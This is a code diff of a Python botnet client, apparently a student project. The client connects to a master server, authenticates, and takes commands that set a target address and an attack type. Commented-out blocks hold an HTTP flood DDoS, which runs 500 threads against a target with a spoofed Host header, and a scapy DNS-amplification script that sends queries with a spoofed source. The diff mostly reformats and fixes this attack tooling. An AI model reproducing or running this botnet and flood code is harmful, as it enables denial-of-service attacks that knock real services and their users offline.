@@ -4,6 +4,7 @@ import string
 import http.client
 import argparse
 import threading
+import select
 from random import *
 
 RECV_BUFFER = 4096
@@ -19,14 +20,16 @@ class Bot():
 		self.authenticated = False
 		self.socket_list: list[socket.socket] = []
 		self.target_address: str = ''
-		self.attk_type: int = 0
+		self.attack_type: int = 0
 		self.attacking: bool = False
 
 		
 	def start(self):
 		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+		#self.sock.bind((self.host, self.port))							#seems to work without
 		self.sock.connect((self.master_server, self.master_port))
-		self.sock.listen()
+		#self.sock.listen()												#cant listen() and connect()?
+		self.socket_list.append(self.sock)
 		print(f"connected to master server at {self.master_server}:{self.master_port}")    
 
 		try:
@@ -65,7 +68,7 @@ class Bot():
 							print("iam command error:", request[2])
 						elif request[1] == 'success': 
 							self.authenticated = True
-					elif request[0] == 'changeip':
+					elif request[0] == 'changeip':                              #did they decide to include port?
 						self.target_address = request[1]
 					elif request[0] == 'changattk':
 						self.attack_type = int(request[1])
@@ -195,22 +198,22 @@ class RequestAttack():
 ## this one is just a ddos
 '''class myAttack1 ():
 
-    target = '192.168.0.12' #mine
-    fake_ip = '182.21.20.32'
-    port = 80
+	target = '192.168.0.12' #mine
+	fake_ip = '182.21.20.32'
+	port = 80
 
-    
-    
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target, port))
-        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        sock.close()
+	
+	
+	while True:
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock.connect((target, port))
+		sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+		sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+		sock.close()
 
-    for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()'''
+	for i in range(500):
+	thread = threading.Thread(target=attack)
+	thread.start()'''
 
 # https://gist.github.com/thom-s/7b3fcdcb88c0670167ccdd6ebca3c924
 ## this one is an amplification ddos
@@ -235,32 +238,32 @@ packet_number=0
 
 # Loop through all query types then all DNS servers
 for i in range(0,len(query_type)):
-    for j in range(0, len(dns_destination)):
-        packet_number += 1
+	for j in range(0, len(dns_destination)):
+		packet_number += 1
 
-        # Craft the DNS query packet with scapy
-        packet = IP(src=dns_source, dst=dns_destination[j], ttl=time_to_live) / UDP() / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
-        
-        # Sending the packet
-        try:
-            query = sr1(packet,iface=interface,verbose=False, timeout=8)
-            print("Packet #{} sent!".format(packet_number))
-        except:
-            print("Error sending packet #{}".format(packet_number))
-        
-        # Creating dictionary with received information
-        try:
-            result_dict = {
-                'dns_destination':dns_destination[j],
-                'query_type':query_type[i],
-                'query_size':len(packet),
-                'response_size':len(query),
-                'amplification_factor': ( len(query) / len(packet) ),
-                'packet_number':packet_number
-            }
-            results.append(result_dict)
-        except:
-            pass
+		# Craft the DNS query packet with scapy
+		packet = IP(src=dns_source, dst=dns_destination[j], ttl=time_to_live) / UDP() / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
+		
+		# Sending the packet
+		try:
+			query = sr1(packet,iface=interface,verbose=False, timeout=8)
+			print("Packet #{} sent!".format(packet_number))
+		except:
+			print("Error sending packet #{}".format(packet_number))
+		
+		# Creating dictionary with received information
+		try:
+			result_dict = {
+				'dns_destination':dns_destination[j],
+				'query_type':query_type[i],
+				'query_size':len(packet),
+				'response_size':len(query),
+				'amplification_factor': ( len(query) / len(packet) ),
+				'packet_number':packet_number
+			}
+			results.append(result_dict)
+		except:
+			pass
 
 # Sort dictionary by the amplification factor
 results.sort(key=operator.itemgetter('amplification_factor'),reverse=True)
@@ -270,9 +273,10 @@ pprint(results)'''
 			
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description = 'Bot Agent')
-	parser.add_argument('host', help='Interface the Bot connects to')
+	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str,
+						default='', help='Interface the server listens at')
 	parser.add_argument('-p', metavar='PORT', type=int, default=8080,
 						help='TCP port (default 8080)')
 	args = parser.parse_args()
-	bot = Bot(args.host, args.p)
+	bot = Bot(args.a, args.p)
 	bot.start()
